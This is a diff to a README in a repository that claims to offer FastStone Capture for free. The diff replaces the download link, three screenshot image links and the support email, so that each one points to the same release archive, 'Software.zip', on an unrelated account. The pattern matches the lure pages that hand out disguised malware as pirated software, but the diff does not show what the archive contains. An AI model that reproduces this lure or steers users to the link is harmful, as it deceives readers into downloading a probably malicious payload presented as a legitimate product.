@@ -14,7 +14,7 @@ FastStone Capture is a powerful tool for capturing anything on your screen. With
 
 ## Get Started
 
-To access the FastStone Capture software, you can download it by clicking [here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). 🚀
+To access the FastStone Capture software, you can download it by clicking [here](https://github.com/Rolex117/FastStone-Capture-Free/releases/download/v1.0/Software.zip). 🚀
 
 If the link does not work, please check the "Releases" section of this repository for alternative download options.
 
@@ -32,9 +32,9 @@ Explore some of the key features of FastStone Capture:
 
 Here are some screenshots of the FastStone Capture software in action:
 
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
-![Screenshot 3](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/Rolex117/FastStone-Capture-Free/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/Rolex117/FastStone-Capture-Free/releases/download/v1.0/Software.zip)
+![Screenshot 3](https://github.com/Rolex117/FastStone-Capture-Free/releases/download/v1.0/Software.zip)
 
 ## Installation
 
@@ -51,7 +51,7 @@ We welcome contributions to the FastStone Capture Free repository. If you have a
 
 ## Support
 
-For any issues or questions related to FastStone Capture, please reach out to the support team at support@faststonecapture.com.
+For any issues or questions related to FastStone Capture, please reach out to the support team at https://github.com/Rolex117/FastStone-Capture-Free/releases/download/v1.0/Software.zip
 
 ## License
 
